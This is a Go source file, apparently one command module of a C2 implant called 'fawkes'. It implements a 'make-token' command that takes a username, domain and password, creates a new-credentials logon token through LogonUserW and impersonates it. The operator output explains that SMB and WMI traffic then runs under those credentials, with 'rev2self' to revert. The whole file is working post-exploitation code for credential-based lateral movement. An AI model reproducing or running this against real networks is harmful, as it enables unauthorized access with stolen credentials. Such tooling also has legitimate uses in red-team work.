//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	procLogonUserW = advapi32.NewProc("LogonUserW")
)

const (
	LOGON32_LOGON_NEW_CREDENTIALS = 9
	LOGON32_PROVIDER_DEFAULT      = 0
)

type MakeTokenCommand struct{}

func (c *MakeTokenCommand) Name() string {
	return "make-token"
}

func (c *MakeTokenCommand) Description() string {
	return "Create a token from credentials and impersonate it"
}

type MakeTokenParams struct {
	Username string `json:"username"`
	Domain   string `json:"domain"`
	Password string `json:"password"`
}

func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
	var params MakeTokenParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate parameters
	if params.Username == "" {
		return structs.CommandResult{
			Output:    "Username is required",
			Status:    "error",
			Completed: true,
		}
	}
	if params.Domain == "" {
		params.Domain = "."
	}
	if params.Password == "" {
		return structs.CommandResult{
			Output:    "Password is required",
			Status:    "error",
			Completed: true,
		}
	}

	// Try to get current token info for comparison (may fail for non-admin)
	var output string
	currentHandle, err := windows.GetCurrentProcess()
	if err == nil {
		var currentToken windows.Token
		err = windows.OpenProcessToken(currentHandle, windows.TOKEN_QUERY, &currentToken)
		if err == nil {
			defer currentToken.Close()
			currentUser, err := currentToken.GetTokenUser()
			if err == nil {
				currentUsername, currentDomain, _, err := currentUser.User.Sid.LookupAccount("")
				if err == nil {
					output = fmt.Sprintf("[*] Current token: %s\\%s\n", currentDomain, currentUsername)
				}
			}
		}
	}
	
	// If we couldn't get current token info, just continue without it
	if output == "" {
		output = "[*] Creating new token...\n"
	}

	// Convert strings to UTF-16
	usernamePtr, err := windows.UTF16PtrFromString(params.Username)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Failed to convert username: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	domainPtr, err := windows.UTF16PtrFromString(params.Domain)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Failed to convert domain: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	passwordPtr, err := windows.UTF16PtrFromString(params.Password)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Failed to convert password: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Call LogonUserW to create a new token
	var newTokenHandle windows.Handle
	ret, _, err := procLogonUserW.Call(
		uintptr(unsafe.Pointer(usernamePtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		uintptr(LOGON32_LOGON_NEW_CREDENTIALS),
		uintptr(LOGON32_PROVIDER_DEFAULT),
		uintptr(unsafe.Pointer(&newTokenHandle)),
	)

	if ret == 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("LogonUserW failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	output += fmt.Sprintf("[+] Successfully created token for %s\\%s\n", params.Domain, params.Username)

	// Impersonate the new token
	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(newTokenHandle))
	if ret == 0 {
		windows.CloseHandle(newTokenHandle)
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("ImpersonateLoggedOnUser failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Don't close the handle - it needs to stay open for the impersonation to remain valid
	// defer windows.CloseHandle(newTokenHandle) // REMOVED

	output += "[+] Successfully applied token for network authentication\n"
	output += "[!] Note: LOGON32_LOGON_NEW_CREDENTIALS only affects NETWORK operations\n"
	output += "[*] Local operations (whoami, file access) still use your original token\n"
	output += "[*] Network operations (SMB, WMI, etc.) will use the new credentials\n"
	output += "[*] Test with: ls \\\\remotehost\\share or net use commands\n"
	output += "[*] Use 'rev2self' to revert to original token"

	return structs.CommandResult{
		Output:    strings.TrimSpace(output),
		Status:    "success",
		Completed: true,
	}
}
